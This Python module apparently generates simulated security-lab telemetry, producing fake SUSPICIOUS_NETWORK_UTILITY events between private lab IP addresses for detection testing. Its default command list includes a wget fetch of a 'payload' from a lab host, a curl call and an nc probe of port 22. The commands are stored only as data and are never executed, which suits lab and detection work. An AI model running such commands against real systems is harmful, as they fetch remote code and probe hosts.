from __future__ import annotations

from datetime import datetime, timezone
from typing import Any


# =========================================================
# PHASE 9.5 — SUSPICIOUS NETWORK UTILITY SIMULATION
# =========================================================

DEFAULT_SOURCE_IP = "192.168.56.203"
DEFAULT_TARGET_IP = "192.168.56.10"

DEFAULT_COMMANDS = [
    "curl http://lab-endpoint.local/test",
    "wget http://lab-endpoint.local/payload",
    "nc -z 192.168.56.10 22",
]


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def simulate_network_utility(
    *,
    source_ip: str = DEFAULT_SOURCE_IP,
    target_ip: str = DEFAULT_TARGET_IP,
    commands: list[str] | None = None,
) -> dict[str, Any]:

    simulated_commands = commands or DEFAULT_COMMANDS

    events = []

    for sequence, command in enumerate(
        simulated_commands,
        start=1,
    ):
        events.append(
            {
                "event_type": "SUSPICIOUS_NETWORK_UTILITY",
                "timestamp": utc_now(),
                "source_ip": source_ip,
                "target_ip": target_ip,
                "command": command,
                "sequence": sequence,
                "utility_category": "NETWORK",
                "execution_result": "SIMULATED",
                "simulation": True,
                "mode": "LAB",
            }
        )

    return {
        "status": "NETWORK_UTILITY_SIMULATED",
        "mode": "LAB",
        "simulation_only": True,
        "real_attack": False,
        "scenario": "SUSPICIOUS_NETWORK_UTILITY",
        "source_ip": source_ip,
        "target_ip": target_ip,
        "commands_simulated": len(simulated_commands),
        "events_generated": len(events),
        "events": events,
    }
